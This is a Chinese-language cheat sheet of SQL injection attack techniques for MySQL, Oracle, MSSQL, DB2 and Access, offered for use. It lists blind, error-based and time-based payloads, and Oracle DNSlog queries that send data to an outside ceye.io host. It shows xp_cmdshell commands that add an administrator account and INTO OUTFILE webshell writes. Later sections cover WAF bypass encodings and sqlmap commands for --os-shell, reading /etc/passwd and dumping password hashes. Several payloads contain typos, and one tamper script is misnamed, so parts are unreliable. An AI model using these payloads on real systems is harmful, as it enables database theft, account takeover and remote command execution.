# 进阶 SQL 注入

## 01 注入基础

### 0101 MySQL

#### 工具注入

- SQLmap
- SuperSQLinj

#### 手工注入

- 报错注入
- 盲注

#### 多条数据显示

- `concat()`
- `group_concat()`
- `concat_ws()`

#### 手工注入常用函数

- `system_user()` 系统用户名
- `user()` 用户名
- `current_user` 当前用户名
- `session_user()` 连接数据库的用户名
- `database()` 数据库名
- `version()` MySQL 数据库版本
- `load_file()` MySQL 读取本地文件的函数
- `@@datadir` 读取数据库路径
- `@@basedir` MySQL 安装路径
- `@@version_compile_os` 操作系统 Windows Server 2003

### 0102 Oracle

#### 工具注入

- SQLmap
- SuperSQLinj
- OracleGetshell

#### 手工注入

- 报错注入
    - 函数报错
    - 除零报错
- 盲注

#### 手工注入常用函数

- user 当前用户
- all_users 所有用户表
- all_tables 当前用户可访问的所有表
- `sys.v_$version` 版本信息表
- `substr()`
- `length()`
- `sign()` 函数根据某个值是0、正数还是负数，返回0、1、-1
- `decode(1=1,0,1,-1)` 第一个参数为表达式，当表达式的值等于参数2时，该函数返回参数3，否则返回参数4

#### 命令执行

通过注入`SYS.DBMS_EXPORT_EXTENSION`函数，在 Oracle 上创建 Java 包 LinuxUtil，里面两个函数，`runCMD` 用于执行系统命令，`readFile`用于读取文件。

### 0103 MSSQL

#### 工具注入

- SQLmap
- SuperSQLinj

#### 手工注入

- `and db_name()>0` 返回的时连接的数据库名
- `and user>0` 作用时获取连接用户名
- `;backup database 数据库名 to disk=’c:\inetpub\wwwroot\1.db’;--` 将数据库备份到Web目录下面
- `and 1=(SELECT @@VERSION)--` 或着 `and 1=convert(int, @@VERSION)--`显示SQL 系统版本
- `and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = ‘X’ AND name = ‘xp_cmdshell’)` 判断 xp_cmdshell 扩展存储过程是否存在
- `;exec master.dbo.sp_addextendedproc ‘xp_cmdshell’, ‘e:\inetput\web\xplog70.dll’;--` 恢复 xp_cmdshell 扩展存储的命令

#### 常用函数

- 数据库表：master..syslogins , master..sysprocesses
- 列名：name , loginname
- 当前用户：user , system_user , suser_sname() , is_srvrolemember(’sysadmin’)
- 数据库凭证：`SELECT user, password FROM master.dbo.sysxlogins`

#### 命令执行

使用 xp_cmdshell 存储过程执行操作系统命令

### 0104 DB2

#### 工具注入

- SQLmap
- SuperSQLinj

#### 手工注入

以下均是整型注入，采用折半法猜解

- 猜用户表数量：`and 0<(SELECT count(NAME) FROM SYSIBM.SYSTABLES WHERE CREATOR=USER)`
- 猜表长度：`and 3<(SELECT LENGTH(NAME) FROM SYSIBM.SYSTABLES WHERE name not in ('COLUMNS') fetch first 1 rows only)`
- 猜表第一个字符ASCII码：`and 3<(SELECT ASCII(SUBSTR(NAME,1,1)) FROM SYSIBM.SYSTABLES WHERE name not in ('COLUMNS') fetch first 1 rows only)`
- 猜表内列名数量：`and 1<(SELECT COUNT(COLNAME) FROM SYSCAT.columns WHERE TABNAME='TABLE')`
- 猜第一个列名的长度：`and 1<(SELECT LENGTH(COLNAME) FROM SYSCAT.columns WHERE TABNAME='TABLE' and colno=0)`
- 猜第一个列名第一个字符的ASCll码：`and 1<(SELECT ASCll(SUBSTR(COLNAME,1,1)) FROM SYSCAT.columns WHERE TABNAME='TABLE' and colno=0)`
- 依ID排降序，猜第一个PASSWD的长度：`and 0<(SELECT LENGTH(PASSWD) FROM TABLE ORDER BY ID DESC fetch first 1 rows only)`

### 0105 Access

#### 工具注入

- SQLmap
- SuperSQLinj
- 明小子
- 啊D

#### 手工注入

- 用户表：`SELECT Name FROM msysobjects WHERE Type = 1 and flags = 0`
- 所有表：`SELECT Name FROM msysobjects WHERE Type = 1`
- 判断版本：
    - `SELECT NULL FROM MSysModules2 '97`
    - `SELECT NULL FROM MSysAccessObjects '97 2000`
    - `SELECT NULL FROM MSysAccessXML '2000 2002-2003`
    - `SELECT NULL FROM MSysAccessStorage '2002-2003 2007`

## 02 MySQL 注入进阶技巧

### 一般盲注

#### 使用 ASCII

- `AND ascii(substring((SELECT password FROM users where id=1),1,1))=49`
- `left(database(),1)>'s'`  // database()数据库名函数，left(a,b)a字符串的左起b位
- `ascii(substr((SELECT table_name FROM information_schema.tables WHERE tables_schema=database() limit 0,1),1,1))=101 --+`  //substr(a,b,c)从b位置开始，截取字符串a的c长度。Ascii()将某个字符转换为ascii值
- `ascii(substr((SELECT database()),1,1))=98`
- `ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM security.users ORDER BY id LIMIT 0,1),1,1))>98%23`  // MID(a.b.c)从位置b开始，截取a字符串的c位，ORD()函数同ascii(），将字符转为ascii值

#### 使用正则表达式

`and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-n]' LIMIT 0,1)`

### 时间盲注

时间盲注又名延时注入

- `sleep()`

`if(ascii(substr(database(),1,1))>115,0,sleep(5))%23`  // if判断语句，条件为假，执行sleep

- `benchmark()`

`UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM (select database() as current) as tb 1;`  // BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的CPU资源

### Order by 注入

为什么要讲 order by注入，因为常规的通用型sq注入防御是参数化查询，order by后的asc、
desc参数是无法参数化的，一些开发人员会使用拼接方法连接语句，产生注入点。

`ASC ,if(1=1),1,(select 1 from information_schema.tables))`

### 数据库版本

1. MySQL 5.0 以后 information _schema 库出现
2. MySQL 5.1 以后 udf 导入xx\lib\plugin\目录下
3. MySQL 5.x 以后 system 执行命令

### 手工注入总结

#### 报错方法集合

`SELECT 1, count(*), concat(0x3a, 0x3a, (SELECT user()), 0x3a, 0x3a, floor(rand(0)*2))a FROM information_schema.columns group by a;`  // 此处有三个点，一是需要concat计数，二是floor，取得0 or 1，进行数据的重复，三是group by进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为mysql的bug的问题。但是此处需要将rand(0)，rand()需要多试几次才行。

上语句可以简化成如下的形式

`SELECT count(**) FROM information_schema.tables GROUP BY concat(version(), floor(rand(0)*2))*`

*如果关键的表被禁用了，可以使用这种形式*

`SELECT *count(*) FROM (SELECT 1 UNION SELECT null UNION SELECT (!1) GROUP BY concat(version(), floor(rand(0)*2)`

如果rand被禁用了可以使用用户变量来报错

`SELECT min(@a:=1) FROM information schema.tables GROUP BY concat(password, @a:=(@a+1)%2)`

`SELECT exp(~(SELECT * FROM(SELECT USER())a))`  //  double数值类型超出范围，Exp()为以e为底的对数函数；版本在5.5.5及以上
`SELECT !(SELECT * FROM (SELECT user())x)- ~0`  //  bigint超出范围；～0是对0逐位取反，很大的版本在5.5.5及以上

`extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) se`  //  mysql对xml数据进行查询和修改的xpath函数，xpath语法错误

`updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)`//  mysql对xml数据进行查询和修改的xpath函数，Xpath语法错误

`SELECT * from (SELECT NAME_CONST(version(), 1), NAME_CONST(version(),1))x;`  //  mysql重复特性，此处重复了version，所以报错

#### 常用语句集合

- ascii(str)
- substr(str, start, len)
- mid(str, 1, 1)
- count([column])
- if(condition, a, b)
- ord()
- sleep()
- left()
- floor()
- rand()
- extractvalue()
- updatexml()
- char()
- strcmp()
- ifnull()
- exp()

#### MySQL 读取写入文件

必备条件

- 读：file 权限必备
- 写：绝对路径、union使用、可以使用“

判断是否具有读写权限

- AND (SELECT count(*) FROM mysql.user)>0/*
- AND (SELECT count(file_priv) FROM mysql.user)>0/*

写文件

- `into outfile` 写文件
- `union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/*`
- `union select 1,2,3,load_file(’d:\web\log123.jpg’),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/*`

## 03 Oracle 注入进阶技巧

### 一般盲注

#### 布尔型盲注

- `AND (SELECT count(table_name) FROM user tables)>1--`  //获取表的个数
- `AND (SELECT length(table_name) FROM user tables WHERE rownum=1)>1--` 1获取第一个表的表名长度
- `AND ascii(substr((SELECT table_ name FROM user tables WHERE rownum=1),1,1))>80--` //获取第一个表的第一个字符的Ascii码的值

#### DNSlog注入

- `union SELECT null, UTL_HTTP.REQUEST((SELECT table name FROM user tables WHERE rownum=1)||'.5nj580.ceye.io'),null FROM DUAL--` //UTL_HTTP.REQUEST型
- `union SELECT null, UTL_INADDR.GET_HOST ADDRESS((SELECT table_name FROM user tables WHERE rownum=1)||'.5nj580.ceye.io'), null FROM DUAL--`//UTL_INADDR.GET_HOST_ADDRESS型

### 时间型盲注

#### DBMS_PIPE.RECEIVE_MESSAGE() 函数

延时盲注 `DBMS_LOCK.SLEEP()` 函数可以让一个过程休眠很多秒，但使用该函数存在许多限制。

首先，不能直接将该函数注入子查询中，因为Oracle不支持堆叠查询(stacked query)。

其次，只有数据库管理员才能使用 DBMS_LOCK 包。

在 Oracle PL/SQL 中有一种更好的办法，可以使用下面的指令以内联方式注入延迟：

`dbms_pipe.receive_message('RDS',10)`

DBMS_PIPE.RECEIVE_MESSAGE 函数将为从 RDS 管道返回的数据等待10秒。默认情况下，允许以public权限执行该包。

`DBMS_LOCK.SLEEP()` 与之相反，它是一个可以用在SQL语句中的函数。

延迟盲注中的应用

- `or 1= dbms pipe.receive_message('RDS', 10)--`
- `and 1=dbms_pipe.receive_message('RDS', 10)--`

#### Decode 函数

`AND 1=(SELECT decode(substr((SELECT table_name FROM user_tables WHERE rownum=1),1,1),’S',(SELECT count(*) FROM all_objects), 1) FROM dual)--`

由于使用了 `SELECT count(*) FROM all_obijects` 方法，因此该过程会严重影响到数据库性能，应谨慎操作

### 手工注入

#### 常用语句

- 当前用户：`SELECT user FROM dual;`
- 列出所有用户：`SELECT username FROM all_users ORDER BY username;`
- 列出数据库：`SELECT DISTINCT owner FROM all tables;`
- 列出表名：
    - `SELECT table_name FROM all_tables;`
    - `SELECT owner, table_name FROM all_tables;`
- 列出字段名：
    - `SELECT column_name FROM all_tab_columns WHERE table_name = 'tablename';`
    - `SELECT column_name FROM all_tab_columns WHERE table_name = 'tablename' and owner='ownername';`
- 定位DB文件：`SELECT name FROM V$DATAFlLE;`

## 04 MSSQL 注入进阶技巧

### 手工注入总结

- `and exists (select * from sysobjects)`  //判断是否是MSSQL
- `and exists(select * from tableName)` //判断某表是否存在..tableName为表名
- `and 1=(select @@VERSION)`  //MSSQL版本
- `and 1=(select db_name())`  //当前数据库名
- `and 1=(select @@servername)`  //本地服务名
- `and 1=(select IS_SRVROLEMEMBER('sysadmin'))`  //判断是否是系统管理员
- `and 1=(select IS_MEMBER('db_owner'))`  //判断是否是库汉限
- `and 1= (select HAS_DBACCESS('master'))`  //判断是否有库读取权限
- `and 1=(select name from master.dbo.Sysdatabases where dbid=1)`  //暴库名DBlD为1，2，3.……
- `;declare @d int`  //是否支持多行
- `and 1=(select count(*) FROM master.dbo.sysobjects Where xtype ='X' AND name='xp_cmdshell')`  // 判断 xp_cmdshell 是否存在
- `and 1=(select count(*) FROM master.dbo.sysobjects where name= 'xp_regread')`  //查看XP regread扩展存储过程是不是已经被删除
- 添加和删除一个SA权限的用户test：（需要SA权限）
    - `exec master.dbo.sp_addlogin test,password`
    - `exec master.dbo.sp addsrvrolemember test,sysadmin`
- 停掉或激活某个服务。（需要SA权限）
    - `exec master..xp_servicecontrol 'stop','schedule'`
    - `exec master..xp_servicecontrol 'start','scheule'`
- 暴网站目录
    - `create table labeng(lala nvarchar(255), id int)`
    - `DECLARE@result varchar(255) EXEC master.dbo.xp_regread`
    - `'HKEY_LOCAL_MACHINE', 'SYSTEM\ControlSet001\Services\W3SVC\Parameters\VirtualRoots' , '/', @result output insert into labeng(lala)values(@result);`
    - `and 1=(select top 1 lala from labeng)` 或者 `and 1=(select count(*) from labeng where lala>1)`

### MSSQL 命令执行

- 是否存在 xp _cmdshell
    - `and 1=(select count(*) from master.dbo.sysobjects where xtype ='x' and name = 'xp_cmdshell')`
- 用 xp_cmdshell 执行命令
    - `;exec master..xp_cmdshell "net user name password /add"--`
    - `;exec master..xp_cmdshell "net localgroup name administrators /add"--`
- 查看权限
    - `and (select IS_SRVROLEMEMBER('sysadmin'))=1--`  //sa
    - `and (select IS_MEMBER('db_owner'))=1--`  //dbo
    - `and (select IS MEMBER('public'))=1--`  //public

# 05 通用型 WAF 绕过思路

### 编码绕过

#### URL编码

- `?id=1 union select pass from admin limit 1`
- `?id=1%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%70%61%73%73%20%66%72%6f%6d%20%61%64%6d%69%6e%20%6c%69%6d%69%74%20%31`

#### Unicode编码

- `'e' => '%u0065'`   // 这是他的Unicode编码
- `?id=1 union select pass from admin limit 1`
- `?id=1 un%u0069on sel%u0065ct pass f%u0072om admin li%u006dit 1`

#### 数据库一些绕过bypass

- mysql 内联注释: `select -> /*!select*/`  // 这样写法
- `select?user,password?from?user?xxx?union?select(1),(2)`  // MySQL中空格也可以用`+`或`/**/`号代替

(切记Mysql `select->sele/**/ct` 不能这样写法,很多文章说能这样写是错误的。 MSSQL松散性问题可以这样写，下面有介绍)

#### GET参数SQL注入%0A换行污染绕过

绕过描述：

在GET请求时，将URL的SQL注入关键字用%0A分隔，%0A是换行符，在mysql中可以正常执行

测试方法：

- `http://www.webshell.com/1.php?id=1 union select 1,2,3,4`    // 被拦截
- `http://www.webshell.com/1.php?id=-9%0Aunion%0Aselect 1,2,3,4`   // 绕过

#### MSSQL

用HEX绕过，一般的DS都无法检测出来

- 0x730079007300610064006D0069006E00=hex(sysadmin)
- 0x640062005F006F0077006E0065007200 =hex(db_owner)

#### 运用注释语句绕过

- 用 `/**/` 代替空格，如：`UNION/**/select/**/user,pwd from tbluser`
- 用 `/**/` 分割敏感词，如：`U/**/NION/**/SE/**/LECT/**/user,pwd from tbluser`

### 复参数绕过

#### 示例链接

`?id=1 union select 1&id=pass from admin`

- 会被拦截
    
    *http://www.***.cn/shownews.asp?id=%28-575%29UNION%20%28SELECT%201,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17,18%20from%28admin%29%29*
    
- 不会被拦截
    
    *http:/www.***.cn/shownews.asp?id=%28-575%29UNION%20%28SELECT%201,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17&id=18%20from%28admin%29%29*
    

#### 两个链接对比

- 第二个链接比第一个链接多了：`&id=`
- 第二个链接比第一个链接少了: `,`

我用参数覆盖的形式绕过了WAF, asp的参数复用`&id=xx` ->变为`, xx`这是个asp一个BUG，也是个绕过的技巧

#### PHP也可以变量覆盖绕过类型，不同于asp

`http://xxx.com/test.php?id=0` 写成 `http://xxx.com/test.php?id=0&id=7 and 1=2` 

`&id=0` ->变为 `&id=7 and 1=2`并没有像asp那样有`,`的出现。id参数重复变量的绕过，重复变量的变体。此方法依实际情况而定，部分WAF允许变量覆盖，也就是相同的变量赋了不同的值，精盖了waf的cache。但是后端程序会优先处理最先前的值。

### 异常Method绕过

数据包如下：

```java
Seay /1.php?id=1 and 1=1 HTTP/1.1
Host: [wWw.cnseay.com](http://www.cnseay.com/)
Accept-Language: zh-cn,zh;q=0.8,en-uS;q=0.5,enjq=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

### 冷门函数/标签绕过

前文中一些报错的函数有时不会被低级WAF拦截

- `/1.php?id=1 and 1=(updatexmI(1,concat(0x3a,(select user())),1));`
- `/1.php?id=1 and extractvalue(1,concat(0x5c,(select table_name from information_schema.tables limit 1));`

### WAF 规则、策略阶段的绕过

#### 关键字拆分绕过

`cnseay.com/1.aspx?id=1;EXEC('ma'+'ster..x'+'p_cm'+'dsh'+'ell "net user"')`

#### 请求方式差异规则松懈性绕过

- 拦截：`GET /id=1 union select 1,2,3,4`
- 绕过：`POST id=1 union select 1,2,3,4`

waf业务限制，POST规则相对松懈

#### HTTP版本绕过

使用 `HTTP/0.9`  `HTTP/1.1` 绕过

#### 另有

- 编码方式绕过(urlencoded/from-data)
- chunked编码绕过
- 超大数据包绕过
- 数据包分块传输绕过

## 06 进阶工具使用技巧

### SQLmap进阶使用技巧

#### Access

- `--url="[http://127.0.0.1/CompHonorBig.asp?id=7](http://127.0.0.1/CompHonorBig.asp?id=7)" --tables` // 列表
- `--url="[http://127.0.0.1/CompHonorBig.asp?id=7](http://127.0.0.1/CompHonorBig.asp?id=7)" --columns -T admin`  // 字段
- `--url="[http://127.0.0.1/CompHonorBig.asp?id=7](http://127.0.0.1/CompHonorBig.asp?id=7)" --dump-T admin -C"username,password"`  // 内容

#### MySQL

- `--url="[http://127.0.0.1/link.php?id=321](http://127.0.0.1/link.php?id=321)" --dbs`
- `--url="[http://127.0.0.1/ink.php?id=321](http://127.0.0.1/ink.php?id=321)" --tables -D myDB`
- `--url="[http://127.0.0.1/link.php?id=321](http://127.0.0.1/link.php?id=321)" --columns -D myDB -T admin`
- `--url="http:/127.0.0.1/link.php?id=321" --dump "username,password" -T admin -D myDB`

#### Cookies 注入

- `--url="[http://127.0.0.1/DownloadShow.asp](http://127.0.0.1/DownloadShow.asp)" --level=2 --cookie=id=9 --tables`
- `--url="[http://127.0.0.1/DownloadShow.asp](http://127.0.0.1/DownloadShow.asp)" --level=2 --cookie=id=9 --tables --columns -T admin`
- `--url="[http://127.0.0.1/DownloadShow.asp](http://127.0.0.1/DownloadShow.asp)" --evel=2 --cookie=id=9 --dump-T admin -C
"username,password"`

#### POST登录框

- `--url="httpi://127.0.0.1/Login.asp" --forms`  // 自动搜
- `--url="[http://127.0.0.1/Login.asp"--data="tfUName=1&tfUPass=1](http://127.0.0.1/Login.asp%22--data=%22tfUName=1&tfUPass=1)"`   // 指定项

#### 执行命令

- `--url="[http://127.0.0.1/new.php?id=](http://127.0.0.1/new.php?id=) 1" --os-cmd=ipconfig`
- `--url="[http://127.0.0.1/new.php?id=1](http://127.0.0.1/new.php?id=1)" --os-shell`

#### 伪静态

- `--url="http://127.0.0.1/xxx*/12345.jhtml" --dbs`
- `--url="[http://127.0.0.1/xxx*/12345.jhtml](http://127.0.0.1/xxx*/12345.jhtml)" -tables -D xxxx`
- `--url="[http://127.0.0.1/xx*/12345.jhtml](http://127.0.0.1/xx*/12345.jhtml)" --columns -D xxxx -T admin`
- `--url="[http://127.0.0.1/xxx*/12345.jhtml](http://127.0.0.1/xxx*/12345.jhtml)" --dump -D xxxx -T admin -C "username,password"`

#### 请求延时

- `--url="[http://127.0.0.1/Indexview/id/40.html](http://127.0.0.1/Indexview/id/40.html)" --delay=2`
- `--url="[http://127.0.0.1/Indexview/id/40.html](http://127.0.0.1/Indexview/id/40.html)" --safe-freg=5`

#### 导出所有数据

`--dump-all`

#### Google

`-g inurl:php?id=`

#### 读文件

`--file-read /etc/passwd`

#### 写文件

`--file-write /mm.php --file-dest /var/www.mm.php`

#### 绕过waf

`--url="http://127.0.0.1/new.php?id=1" --tamper space2morehash.py --level=3 --batch --dbs space2hash.py base64encode.py charencode.py`

#### 判断当前用户是否是dba

`python sqlmap.py -u "url" --is-dba`

#### 列出数据库管理系统用户

`python sqlmap.py -u "url" --users`

#### 数据库用户密码（hash）

`python sqlmap.py -u "url" --passwords`

`python sqlmap.py -u "url" --passwords -U sa`

#### 查看用户权限

`python sqlmap.py -u "url" --privileges`

`python sqlmap.py -u "url" --privileges -U postgres`

#### 可以利用的数据库

`python sqlmap.py -u "url" --dbs`

#### 列数据库表

`python sqlmap.py -u "url" --tables -D "db_name"`

#### 查看列名

`python sqlmap.py -u "url" --columns -T "table_name1,name2" -D "db name"`

#### **常用tamper脚本**

**apostrophemask.py**

适用数据库：ALL

作用：将引号替换为utf-8，用于过滤单引号

使用脚本前：`tamper("1 AND '1'='1")`

使用脚本后：`1 AND %EF%BC%871%EF%BC%87=%EF%BC%871`

**base64encode.py**

适用数据库：ALL

作用：替换为base64编码

使用脚本前：`tamper("1' AND SLEEP(5)#")`

使用脚本后：`MScgQU5EIFNMRUVQKDUpIw==`

**multiplespaces.py**

适用数据库：ALL

作用：围绕sql关键字添加多个空格

使用脚本前：`tamper('1 UNION SELECT foobar')`

使用脚本后：`1 UNION SELECT foobar`

**space2plus.py**

适用数据库：ALL

作用：用加号替换空格

使用脚本前：`tamper('SELECT id FROM users')`

使用脚本后：`SELECT+id+FROM+users`

**nonrecursivereplacement.py**

适用数据库：ALL

作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）

使用脚本前：`tamper('1 UNION SELECT 2--')`

使用脚本后：`1 UNIOUNIONN SELESELECTCT 2--`

**space2randomblank.py**

适用数据库：ALL

作用：将空格替换为其他有效字符

使用脚本前：`tamper('SELECT id FROM users')`

使用脚本后：`SELECT%0Did%0DFROM%0Ausers`

**unionalltounion.py**

适用数据库：ALL

作用：将`union allselect` 替换为`unionselect`

使用脚本前：`tamper('-1 UNION ALL SELECT')`

使用脚本后：`-1 UNION SELECT`

**securesphere.py**

适用数据库：ALL

作用：追加特定的字符串

使用脚本前：`tamper('1 AND 1=1')`

使用脚本后：`1 AND 1=1 and '0having'='0having'`

**space2dash.py**

适用数据库：ALL

作用：将空格替换为`--`，并添加一个随机字符串和换行符

使用脚本前：`tamper('1 AND 9227=9227')`

使用脚本后：`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227`

**space2mssqlblank.py**

适用数据库：Microsoft SQL Server

测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005

作用：将空格随机替换为其他空格符号`('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')`

使用脚本前：`tamper('SELECT id FROM users')`

使用脚本后：`SELECT%0Eid%0DFROM%07users`

**between.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

作用：用`NOT BETWEEN 0 AND #`替换`>`

使用脚本前：`tamper('1 AND A > B--')`

使用脚本后：`1 AND A NOT BETWEEN 0 AND B--`

**percentage.py**

适用数据库：ASP

测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0

作用：在每个字符前添加一个`%`

使用脚本前：`tamper('SELECT FIELD FROM TABLE')`

使用脚本后：`%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E`

**sp_password.py**

适用数据库：MSSQL

作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password

使用脚本前：`tamper('1 AND 9227=9227-- ')`

使用脚本后：`1 AND 9227=9227-- sp_password`

**charencode.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）

使用脚本前：`tamper('SELECT FIELD FROM%20TABLE')`

使用脚本后：`%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45`

**randomcase.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

作用：随机大小写

使用脚本前：`tamper('INSERT')`

使用脚本后：`INseRt`

**charunicodeencode.py**

适用数据库：ASP、ASP.NET

测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3

作用：适用字符串的unicode编码

使用脚本前：`tamper('SELECT FIELD%20FROM TABLE')`

使用脚本后：`%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045`

**space2comment.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

作用：将空格替换为`/**/`

使用脚本前：`tamper('SELECT id FROM users')`

使用脚本后：`SELECT/**/id/**/FROM/**/users`

**equaltolike.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5

作用：将`=`替换为`LIKE`

使用脚本前：`tamper('SELECT * FROM users WHERE id=1')`

使用脚本后：`SELECT * FROM users WHERE id LIKE 1`

**equaltolike.py**

测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

作用：将`>`替换为GREATEST，绕过对`>`的过滤

使用脚本前：`tamper('1 AND A > B')`

使用脚本后：`1 AND GREATEST(A,B+1)=A`

**ifnull2ifisnull.py**

适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)

测试通过数据库：MySQL 5.0 and 5.5

作用：将类似于`IFNULL(A, B)`替换为`IF(ISNULL(A), B, A)`，绕过对`IFNULL`的过滤

使用脚本前：`tamper('IFNULL(1, 2)')`

使用脚本后：`IF(ISNULL(1),2,1)`

**modsecurityversioned.py**

适用数据库：MySQL

测试通过数据库：MySQL 5.0

作用：过滤空格，使用mysql内联注释的方式进行注入

使用脚本前：`tamper('1 AND 2>1--')`

使用脚本后：`1 /*!30874AND 2>1*/--`

**space2mysqlblank.py**

适用数据库：MySQL

测试通过数据库：MySQL 5.1

作用：将空格替换为其他空格符号`('%09', '%0A', '%0C', '%0D', '%0B')`

使用脚本前：`tamper('SELECT id FROM users')`

使用脚本后：`SELECT%0Bid%0DFROM%0Cusers`

**modsecurityzeroversioned.py**

适用数据库：MySQL

测试通过数据库：MySQL 5.0

作用：使用内联注释方式`（/*!00000*/）`进行注入

使用脚本前：`tamper('1 AND 2>1--')`

使用脚本后：`1 /*!00000AND 2>1*/--`

**space2mysqldash.py**

适用数据库：MySQL、MSSQL

作用：将空格替换为 `--` ，并追随一个换行符

使用脚本前：`tamper('1 AND 9227=9227')`

使用脚本后：`1--%0AAND--%0A9227=9227`

**bluecoat.py**

适用数据库：Blue Coat SGOS

测试通过数据库：MySQL 5.1,、SGOS

作用：在sql语句之后用有效的随机空白字符替换空格符，随后用`LIKE`替换`=`

使用脚本前：`tamper('SELECT id FROM users where id = 1')`

使用脚本后：`SELECT%09id FROM users where id LIKE 1`

**versionedkeywords.py**

适用数据库：MySQL

测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11

作用：注释绕过

使用脚本前：`tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')`

使用脚本后：`1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#`

**halfversionedmorekeywords.py**

适用数据库：MySQL < 5.1

测试通过数据库：MySQL 4.0.18/5.0.22

作用：在每个关键字前添加mysql版本注释

使用脚本前：`tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")`

使用脚本后：`value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa`

**space2morehash.py**

适用数据库：MySQL >= 5.1.13

测试通过数据库：MySQL 5.1.41

作用：将空格替换为`#`，并添加一个随机字符串和换行符

使用脚本前：`tamper('1 AND 9227=9227')`

使用脚本后：`1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227`

**apostrophenullencode.py**

适用数据库：ALL

作用：用非法双字节Unicode字符替换单引号

使用脚本前：`tamper("1 AND '1'='1")`

使用脚本后：`1 AND %00%271%00%27=%00%271`

**appendnullbyte.py**

适用数据库：ALL

作用：在有效载荷的结束位置加载null字节字符编码

使用脚本前：`tamper('1 AND 1=1')`

使用脚本后：`1 AND 1=1%00`

**chardoubleencode.py**

适用数据库：ALL

作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）

使用脚本前：`tamper('SELECT FIELD FROM%20TABLE')`

使用脚本后：`%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545`

**unmagicquotes.py**

适用数据库：ALL

作用：用一个多字节组合`%bf%27`和末尾通用注释一起替换空格

使用脚本前：`tamper("1' AND 1=1")`

使用脚本后：`1%bf%27 AND 1=1--`

**randomcomments.py**

适用数据库：ALL

作用：用注释符分割sql关键字

使用脚本前：`tamper('INSERT')`

使用脚本后：`I/**/N/**/SERT`

#### 绕过脚本及汪释

1. apostrophemask.py  // 用UTF-8全角字符替换单引号字符
2. apostrophenullencode.py  // 用非法双子节unicode字符替换单引号字符
3. appendnullbyte.py  // 在payload末尾添加空字符编码
4. base64encode.py  // 对给定的payload全部字符使用Base64编码
5. between.py  // 分别用“NOT BETWEEN OAND #“替换大于号“>”，“BETWEEN # AND #” 替换等于号“=“
6. bluecoat.py  // 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”
7. chardoubleencode.py  // 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）
8. charencode.py  // 对给定的payload全部字付使用URL编码（不处理已经编码的子符）
